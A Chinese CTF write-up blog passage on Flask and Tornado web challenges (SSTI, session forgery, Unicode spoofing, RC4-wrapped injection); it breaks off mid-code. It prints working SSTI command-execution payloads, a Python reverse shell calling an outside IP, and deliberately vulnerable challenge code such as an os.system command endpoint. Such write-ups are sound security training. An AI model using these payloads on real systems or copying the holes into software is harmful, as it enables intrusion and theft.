<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h3 id="TODO">TODO</h3>
<h2 id="护网杯2018-easy-tornado">护网杯2018 easy_tornado</h2>
<h3 id="考点-v4">考点</h3>
<ul>
<li>tornado 模板注入</li>
</ul>
<h3 id="解题-v4">解题</h3>
<p>这道题很重要的一个地方就是观察url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;eca90b16e91faf8d52c04e7ef7e7a8fc</span><br></pre></td></tr></table></figure>
<p>并且filehash=md5(cookie_secret+md5(filename))，所以要找到cookie_secret的值。</p>
<p>当不输入filehash参数的时候，url是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></figure>
<p>并且页面回显Error，这个就需要比较敏感的注意到这里是模板注入的点。</p>
<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#3-Tornado">参考文章</a>用的就是handler.settings对象</p>
<blockquote>
<p>handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所有handler.settings就指向RequestHandler.application.settings了。</p>
</blockquote>
<p>所以传递<code>error?msg=&#123;&#123; handler.settings &#125;&#125;</code>得到cookie_secret。</p>
<h2 id="HCTF-2018-Hideandseek">HCTF 2018 Hideandseek</h2>
<h3 id="TODO-v2">TODO</h3>
<h2 id="CISCN2019-总决赛-Day1-Web3-Flask-Message-Board">[CISCN2019 总决赛 Day1 Web3]Flask Message Board</h2>
<h3 id="TODO-v3">TODO</h3>
<h2 id="HCTF2018-Admin">HCTF2018 Admin</h2>
<p>出题人writeup：<a href="https://www.ckj123.com/?p=147">https://www.ckj123.com/?p=147</a></p>
<h3 id="考点-v5">考点</h3>
<ul>
<li>Flask Session伪造</li>
<li>Unicode欺骗</li>
<li>条件竞争</li>
</ul>
<h3 id="解题-v5">解题</h3>
<h4 id="方法一-Unicode编码欺骗">方法一 Unicode编码欺骗</h4>
<p>结合改密码的功能，看一下<code>change</code>函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br></pre></td></tr></table></figure>
<p>其中第6行的<code>strlower</code>是自己封装的一个函数，并没有使用Python的库函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
<p>其中 <code>nodeprep</code> 来自 <code>twisted.words.protocols.jabber.xmpp_stringprep</code>。</p>
<p>并且在注册和登录的代码中都使用了这个函数，所以不能用<code>ADMIN</code>绕过。</p>
<p>这里有一篇文章讲到了nodeprep关于Unicode编码的问题：</p>
<blockquote>
<p><a href="https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e">https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e</a></p>
</blockquote>
<p>使用两次<code>nodeprep.prepare</code>函数会进行如下操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ᴬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Unicode —&gt; 中文：<a href="https://tool.chinaz.com/tools/unicode.aspx">https://tool.chinaz.com/tools/unicode.aspx</a></p>
</blockquote>
<p>即第一次将其转换为大写，第二次将其转换为小写。</p>
<p>思路：</p>
<ul>
<li>注册用户ᴬdmin</li>
<li>登录用户ᴬdmin，变成Admin</li>
<li>修改密码Admin，更改了admin的密码</li>
</ul>
<h4 id="方法二-Flask-session-伪造">方法二 Flask session 伪造</h4>
<blockquote>
<p>原理：<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
<p>工具：<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223051.png" alt=""></p>
<p>修改<code>name</code>为<code>admin</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;6604bc7a9890f6bf08233451da34826f785818ecb989720b4c7e7aa4f22105e0b28a5122c9e9b490f8c9609baa8efab128409afc0a7ce5ba93ccd50994d78d37&#39;, &#39;csrf_token&#39;: b&#39;135d7b0b615153fd276627d995e71a0026f75bb3&#39;, &#39;image&#39;: b&#39;mwPn&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure>
<p>再对其进行encode操作：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223440.png" alt=""></p>
<p>更改cookie的值：</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223656.png" style="zoom:67%;" />
<p>提交更改，刷新页面，成功获取flag~</p>
<h4 id="方法三-条件竞争">方法三 条件竞争</h4>
<blockquote>
<p><a href="https://tmr.js.org/p/3a03e44b/">https://tmr.js.org/p/3a03e44b/</a></p>
<p>不由的感叹这些人的脑子怎么这么好使。。。😂</p>
</blockquote>
<h2 id="BJDCTF-2nd-fake-google">BJDCTF 2nd fake google</h2>
<h3 id="考点-v6">考点</h3>
<ul>
<li>Flask SSTI 文件读取</li>
</ul>
<h3 id="解题-v6">解题</h3>
<p>这道题就是比较明显的Flask 模板注入漏洞了，也没有什么绕过，直接上payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__&#x3D;&#x3D;%27catch_warnings%27%20%&#125;&#123;&#123;%20c.__init__.__globals__[%27__builtins__%27].eval(&quot;__import__(%27os%27).popen(%27cat%20&#x2F;flag%27).read()&quot;)%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF2020-Cookie-is-stable">BJDCTF2020 Cookie is stable</h2>
<h3 id="考点-v7">考点</h3>
<ul>
<li>Python Twig模板注入</li>
</ul>
<h3 id="解题-v7">解题</h3>
<p>和上题一样是模板注入，不过注入点在Cookie里</p>
<p>渲染引擎也换成了基于Python的Twig</p>
<p>从网上找到的 Twig poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id=""></h3>
<h2 id="V-N公开赛-CheckIn">V&amp;N公开赛 CheckIn</h2>
<h3 id="考点-v8">考点</h3>
<ul>
<li>反弹shell</li>
<li>文件描述符</li>
</ul>
<h3 id="解题-v8">解题</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;app.py&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>shell路由可以执行命令，但是在执行命令之前flag.txt已经被删除了，并且不能回显命令执行的结果。</p>
<p>首先肯定是想到反弹一个shell，用BUU小号开一个Linux主机，尝试有bash、curl、nc、python -c等，但是这里测试后发现这些常用的命令都被禁了，无法反弹Shell。最后再换成python3就可以成功反弹shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc5fa49b-316a-47e1-8737-20050c013abe.node3.buuoj.cn&#x2F;shell?c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.2.25.118%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>
<p>接下来的一个考点就是通过文件描述符来恢复文件。</p>
<blockquote>
<p>什么是文件描述符</p>
<p>例如Python中，当我们open()函数打开一个文件时便创建了一个文件描述符，而后对这个文件描述符使用read()函数便是读取文件描述符中的内容，close()函数用于关闭/销毁这个文件描述符。</p>
<p>文件描述符储存在什么地方：</p>
<p><code>/proc/&lt;pid&gt;/fd/&lt;id&gt;</code></p>
</blockquote>
<p>查看<code>/proc</code>目录下的进程号</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102353.png" alt=""></p>
<p>查看进程号等于10下面的fd目录</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102509.png" alt=""></p>
<p>文件描述符等于3即为flag文件</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102615.png" alt=""></p>
<h2 id="CISCN2019-华东南赛区-Double-Secret">CISCN2019 华东南赛区 Double Secret</h2>
<h3 id="考点-v9">考点</h3>
<ul>
<li>模板注入</li>
<li>RC4加密</li>
</ul>
<h3 id="解题-v9">解题</h3>
<p>扫目录得到secret，访问提示要有secret参数，Fuzz一下发现报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">File &quot;&#x2F;app&#x2F;app.py&quot;, line 35, in secret</span><br><span class="line">    if(secret&#x3D;&#x3D;None):</span><br><span class="line">        return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;</span><br><span class="line">    rc&#x3D;rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line">    deS&#x3D;rc.do_crypt(secret)</span><br><span class="line">    a&#x3D;render_template_string(safe(deS))</span><br><span class="line">    if &#39;ciscn&#39; in a.lower():</span><br><span class="line">        return &#39;flag detected!&#39;</span><br><span class="line">      return a</span><br></pre></td></tr></table></figure>
<p>如果你传入了参数，那么它就会进行加密，可以看到是RC4加密，而且还泄露了密钥，密钥就是“HereIsTreasure”，而且通过报错，我们了解到这是flask的模板，而且python的版本是2.7的，那么我们可以利用flask的模板注入，执行命令，只不过需要进行RC4加密。</p>
<p>RC4加密脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>))</span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到加密后的payload后传入，拿到flag。</p>
<h2 id="GXYCTF2019-Strongest-Mind">GXYCTF2019 Strongest Mind</h2>
<h3 id="考点-v10">考点</h3>
<ul>
<li>Python脚本</li>
</ul>
<h3 id="解题-v10">解题</h3>
<p>注意Session的使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7a9216ad-bfec-45c5-a89e-71e8190e8299.node3.buuoj.cn/&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">a = s.get(url)</span><br><span class="line">pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text)</span><br><span class="line">c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">a = s.post(url, data=&#123;<span class="string">&quot;answer&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text)</span><br><span class="line">    c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">    print(c)</span><br><span class="line">    a = s.post(url, data=&#123;<span class="string">&quot;answer&quot;</span>: c&#125;)</span><br><span class="line">print(a.content)</span><br></pre></td></tr></table></figure>
<h2 id="DDCTF2019-homebrew-event-loop">DDCTF2019 homebrew event loop</h2>
<h3 id="考点-v11">考点</h3>
<ul>
<li>逻辑漏洞</li>
<li>flask session</li>
</ul>
<h3 id="解题-v11">解题</h3>
<p>详细wp：<a href="https://blog.cindemor.com/post/ctf-web-16.html">https://blog.cindemor.com/post/ctf-web-16.html</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">&#x27;/d5afe1f66147e857&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span></span><br><span class="line">	<span class="comment"># event = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]</span></span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=None</span>):</span></span><br><span class="line">	<span class="comment"># haystack = action:trigger_event%23;action:buy;5%23action:get_flag;</span></span><br><span class="line">	<span class="comment"># prefix = trigger_event%23;</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span></span><br><span class="line">    valid_event_chars = set(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        	<span class="comment"># event = action:trigger_event%23;action:buy;5%23action:get_flag;</span></span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            <span class="comment"># action = trigger_event%23</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            <span class="comment"># args = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]</span></span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = eval(</span><br><span class="line">                	<span class="comment"># event_handler = trigger_event#_handler</span></span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                <span class="comment"># ret_val = trigger_event([&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;])</span></span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix+&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span>():</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;</span>.format(</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>], session[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;shop&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">        html += <span class="string">&#x27;Session reset.&lt;br /&gt;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    bool_show_source = 